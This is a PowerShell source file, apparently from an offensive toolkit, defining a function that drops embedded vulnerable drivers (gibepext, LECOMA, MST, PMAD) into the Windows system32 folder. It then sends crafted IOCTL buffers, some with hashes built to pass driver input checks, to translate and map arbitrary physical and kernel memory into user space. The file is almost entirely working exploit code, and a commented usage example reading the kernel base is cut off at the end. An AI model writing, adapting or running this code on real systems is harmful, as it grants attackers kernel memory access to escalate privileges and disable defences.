# gibepext, LECOMA, MST, PMAD
function Map-KernelMemory {
    [CmdletBinding()]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [ValidateRange(1, 4096)]
        [Int32]$Size = 4,

        [switch]$AsByte,
        [switch]$AsShort,
        [switch]$AsInt,
        [switch]$AsLong,

        [ValidateSet('gibepext', 'LECOMA', 'MST', 'PMAD')]
        [string]$Mode = 'gibepext',

        [ValidateSet('MmCached','MmNonCached','MmWriteCombined')]
        [string]$CacheType = 'MmCached'
    )
    if ($Size -le 0) { $Size = 4  }
    if ($AsByte)     { $Size = 1 }
    if ($AsShort)    { $Size = 2 }
    if ($AsInt)      { $Size = 4 }
    if ($AsLong)     { $Size = 8 }

    switch ($CacheType) {
        'MmNonCached'      { $CacheTypeValue = 0 }
        'MmCached'         { $CacheTypeValue = 1 }
        'MmWriteCombined'  { $CacheTypeValue = 2 }
    }

    if ($Mode -eq 'gibepext') {

        $DriverName    = "GibEpExt"        
        $DriverNameAlt = "GibEpFirmware"  
        $TransIoctl    = 2285604
        $MainIoctl     = 2285588

        if (-not [File]::Exists("C:\windows\system32\gibepext.sys")) {
            Import-EmbeddedBlock -BlockName gibepext -OutPath 'C:\windows\system32\gibepext.sys' | Out-Null
        }

    } elseif ($Mode -eq 'LECOMA') {

        $DriverName    = "LECOMAx64"        
        $DriverNameAlt = "LECOMA64_2"  
        $TransIoctl    = 0x80002013
        $MainIoctl     = 0x80002003

        if (-not [File]::Exists("C:\windows\system32\LECOMAx64.sys")) {
            Import-EmbeddedBlock -BlockName LECOMA -OutPath 'C:\windows\system32\LECOMAx64.sys' | Out-Null
        }
    } elseif ($Mode -eq 'MST') {

        $DriverName    = "mst"        
        $DriverNameAlt = "mst64_4.20.0"
        $MainIoctl     = 0x222010

        if (-not [File]::Exists("C:\windows\system32\MST.sys")) {
            Import-EmbeddedBlock -BlockName MST -OutPath 'C:\windows\system32\MST.sys' | Out-Null
        }
    } elseif ($Mode -eq 'PMAD') {

        $DriverName    = "PMAD"        
        $DriverNameAlt = "NTPMAD"
        $MainIoctl     = 0x80002000

        if (-not [File]::Exists("C:\windows\system32\PMAD.sys")) {
            Import-EmbeddedBlock -BlockName PMAD -OutPath 'C:\windows\system32\PMAD.sys' | Out-Null
        }
    }
    if ($Mode -eq 'PMAD') {
        $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt -Symbolic 'Device'
    } else {
        $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt
    }
    if ($null -eq $hDevice -or $hDevice -eq 0) { 
        throw Write-Error "Invalid handle to $DriverName device."
    }

    $MainInOut  = $null
    $ReadOutPtr = $null
    $BytesRet   = New-IntPtr -Size 8

    try {
        # STEP 1: TRANSLATE VIRTUAL ADDRESS TO PHYSICAL ADDRESS
        if ($PA -eq 0L) {
            if ($Mode -eq 'gibepext') {

                $buffer = New-Object byte[] 12
                [BitConverter]::GetBytes($VA.ToInt64()).CopyTo($buffer, 0)
            
                $crc = Get-KernelCustomHash ([byte[]]($buffer[0..7]))
                [BitConverter]::GetBytes([UInt32]$crc).CopyTo($buffer, 8)
                $MainInOut = New-IntPtr -Data $buffer
            
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 12, $MainInOut, 12, $BytesRet, [IntPtr]::Zero)) { 
                    return [pscustomobject][ordered]@{
                        Device          = $hDevice
                        CacheType       = $CacheType
                        VirtualAddress  = $VA
                        PhysicalAddress = 0L
                        MappedAddress   = 0L
                    }
                }

                $PA = [Marshal]::ReadInt64($MainInOut, 0)
                if ($PA -eq 0) { throw "Translation returned an invalid physical address." }

            } elseif ($Mode -eq 'LECOMA') {

                $buffer = New-Object byte[] 8
                [BitConverter]::GetBytes($VA.ToInt64()).CopyTo($buffer, 0)
                $MainInOut = New-IntPtr -Data $buffer
            
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 8, $MainInOut, 8, $BytesRet, [IntPtr]::Zero)) { 
                    return [pscustomobject][ordered]@{
                        Device          = $hDevice
                        CacheType       = $CacheType
                        VirtualAddress  = $VA
                        PhysicalAddress = 0L
                        MappedAddress   = 0L
                    }
                }

                $PA = [Marshal]::ReadInt64($MainInOut, 0)
                if ($PA -eq 0) { throw "Translation returned an invalid physical address." }

            } elseif ($Mode -match 'MST|PMAD') {

                $PA = Convert-VirtualToPhysical -VirtualAddress $VA
            }
        }

        # STEP 2: MAP PHYSICAL ADDRESS
        if ($Mode -eq 'gibepext') {
            
            # 1. Configuration: 28 bytes total (0x1C)
            $TotalSize = 28
            $ByteBuffer = [byte[]]::new($TotalSize)
            [BitConverter]::GetBytes([UInt64]$PA).CopyTo($ByteBuffer, 0)
            [BitConverter]::GetBytes([UInt32]$Size).CopyTo($ByteBuffer, 8)
            [BitConverter]::GetBytes([UInt32]$CacheTypeValue).CopyTo($ByteBuffer, 16)
            $HashBuffer = [byte[]]::new(24)
            [Buffer]::BlockCopy($ByteBuffer, 0, $HashBuffer, 0, 24)
            $CalculatedHash = Get-KernelCustomHash -Data $HashBuffer
            [BitConverter]::GetBytes([UInt32]$CalculatedHash).CopyTo($ByteBuffer, 24)

            # 5. Execute IOCTL
            $MainInOut = New-IntPtr -Data $ByteBuffer
            $ReadOutPtr = [Marshal]::AllocHGlobal(8)

            # Use 28 as the input size to pass the v44.LowPart < 0x1C check
            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, 28, $ReadOutPtr, 8, $BytesRet, [IntPtr]::Zero)) {
                return [pscustomobject][ordered]@{
                    Device          = $hDevice
                    CacheType       = $CacheType
                    VirtualAddress  = $VA
                    PhysicalAddress = $PA
                    MappedAddress   = 0L
                }
            }

        } elseif ($Mode -eq 'LECOMA') {
           
            switch ($CacheType) {
                'MmNonCached'     { $CacheValue = 0 } # Basic path
                'MmCached'        { $CacheValue = 1 } # NonPagedPool path (sub_11140)
                'MmWriteCombined' { $CacheValue = 2 } # Configurable path (sub_11420)
                Default           { $CacheValue = 1 } # Default to Cached
            }

            $TotalSize = 32
            $ByteBuffer = [byte[]]::new($TotalSize)
            [BitConverter]::GetBytes([UInt64]$PA).CopyTo($ByteBuffer, 0)
            [BitConverter]::GetBytes([UInt32]$CacheValue).CopyTo($ByteBuffer, 8)
            [BitConverter]::GetBytes([UInt32]$Size).CopyTo($ByteBuffer, 16)
            [BitConverter]::GetBytes([UInt32]2).CopyTo($ByteBuffer, 20)

            # --- STEP 3: EXECUTE IOCTL ---
            $MainInOut = New-IntPtr -Data $ByteBuffer
            $ReadOutPtr = [Marshal]::AllocHGlobal(8)

            # Send the full 48 bytes structural buffer
            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, 32, $MainInOut, 8, $BytesRet, [IntPtr]::Zero)) {
                return [pscustomobject][ordered]@{
                    Device          = $hDevice
                    CacheType       = $CacheType
                    VirtualAddress  = $VA
                    PhysicalAddress = $PA
                    MappedAddress   = 0L
                }
            }

        } elseif ($Mode -eq 'MST') {
            
            $MainInOut = New-IntPtr -Size 8 -InitialValue $PA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, 8, $MainInOut, 8, $BytesRet, [IntPtr]::Zero)) {
                return [pscustomobject][ordered]@{
                    Device          = $hDevice
                    CacheType       = $CacheType
                    VirtualAddress  = $VA
                    PhysicalAddress = $PA
                    MappedAddress   = 0L
                }
            }
        } elseif ($Mode -eq 'PMAD') {
            
            # PMAD Layout: 24-Byte Header + $Size trailing space for inline data delivery
            $StructSize = 24 + $Size
            $MainInOut  = New-IntPtr -Size $StructSize

            # Populate the PMAD structure fields via Marshal offsets
            [Marshal]::WriteInt64($MainInOut, 0x00, 1)
            [Marshal]::WriteInt64($MainInOut, 0x08, $PA)
            [Marshal]::WriteInt32($MainInOut, 0x10, 0)
            [Marshal]::WriteInt32($MainInOut, 0x14, $Size)

            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, $StructSize, $MainInOut, $StructSize, [IntPtr]::Zero, [IntPtr]::Zero)) {
                return [pscustomobject][ordered]@{
                    Device          = $hDevice
                    CacheType       = $CacheType
                    VirtualAddress  = $VA
                    PhysicalAddress = $PA
                    MappedAddress   = 0L
                }
            }
        }
        
        # STEP 3: RESOLVE TARGET ADDRESS POINTER
        if ($Mode -eq 'PMAD') {
            $NewPointer = [Marshal]::AllocHGlobal($Size)
            $SrcInlineData = $MainInOut
            $TmpBridge = [Byte[]]::new($Size)
            [Marshal]::Copy($SrcInlineData, $TmpBridge, 0, $Size)
            [Marshal]::Copy($TmpBridge, 0, $NewPointer, $Size)
            $MappedAddress = $NewPointer
        } else {
            # Standard modes: Extract the virtual address pointer returned by the driver
            $SrcAddress = if ($Mode -eq 'gibepext') { $ReadOutPtr } else { $MainInOut }
            $MappedAddress = [Marshal]::ReadInt64($SrcAddress, 0)
        }

        return [pscustomobject][ordered]@{
            Device          = $hDevice
            Mode            = $Mode
            CacheType       = $CacheType
            VirtualAddress  = $VA
            PhysicalAddress = $PA
            MappedAddress   = [IntPtr]$MappedAddress
        }
    
    } finally {
        Free-IntPtr -handle $MainInOut
        Free-IntPtr -handle $ReadOutPtr
        Free-IntPtr -handle $BytesRet
    }
}

<#
Clear-Host
Write-Host
$va = Map-VirtualAddress -va (Get-KernelBaseAddress) -BlockSize 1024 -DriverName iobios
if ($null -ne $va -and $va -ne 0L) {
    $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
    $Data = [byte[]]::new(1024)
    [marshal]::Copy($Address, $Data,0, 1024)
